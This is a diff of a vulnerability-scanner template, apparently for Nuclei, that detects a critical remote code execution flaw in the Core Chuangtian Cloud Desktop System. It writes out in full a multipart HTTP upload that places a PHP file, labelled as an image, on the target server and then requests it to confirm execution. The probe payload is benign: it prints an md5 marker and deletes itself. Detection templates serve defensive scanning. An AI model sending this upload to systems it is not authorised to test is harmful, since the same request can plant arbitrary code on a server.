@@ -1,11 +1,21 @@
 id: core-chuangtian-cloud-rce
 
 info:
-  name: Core Chuangtian Cloud Desktop System RCE
+  name: Core Chuangtian Cloud Desktop System - Remote Code Execution
   author: pikpikcu
   severity: critical
-  reference: https://mp.weixin.qq.com/s/wH5luLISE_G381W2ssv93g
-  tags: rce
+  description: Core Chuangtian Cloud Desktop System is susceptible to remote code execution vulnerabilities.
+  reference:
+    - https://mp.weixin.qq.com/s/wH5luLISE_G381W2ssv93g
+  classification:
+    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
+    cvss-score: 10
+    cwe-id: CWE-77
+  metadata:
+    max-request: 2
+  tags: rce,fileupload,intrusive,cloud,chuangtian
+variables:
+  string: "core-chuangtian-cloud-rce"
 
 http:
   - raw:
@@ -18,20 +28,18 @@ http:
         Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryfcKRltGv
 
         ------WebKitFormBoundaryfcKRltGv
-        Content-Disposition: form-data; name="file"; filename="test.php"
+        Content-Disposition: form-data; name="file"; filename="{{randstr}}.php"
         Content-Type: image/avif
 
-        <?php phpinfo(); ?>
+        <?php echo md5("{{string}}");unlink(__FILE__);?>
         ------WebKitFormBoundaryfcKRltGv--
-
       - |
-        GET /Upload/test/test.php HTTP/1.1
+        GET /Upload/test/{{randstr}}.php HTTP/1.1
         Host: {{Hostname}}
 
-    req-condition: true
     matchers:
-      - type: dsl
-        dsl:
-          - 'contains(body_2, "PHP Version")'
-          - 'status_code_2 == 200'
-        condition: and
+      - type: word
+        part: body_2
+        words:
+          - '{{md5(string)}}'
+# digest: 4b0a00483046022100b3dd2f15f2a175aa2be910ce7b30e55065315e7be5d81c5e83e293708c32371a022100b03d7379f6755bfc7d905b8cadab991efe8553906b0273c91667d39a8db448d6:922c64590222798bb761d5b6d8e72950
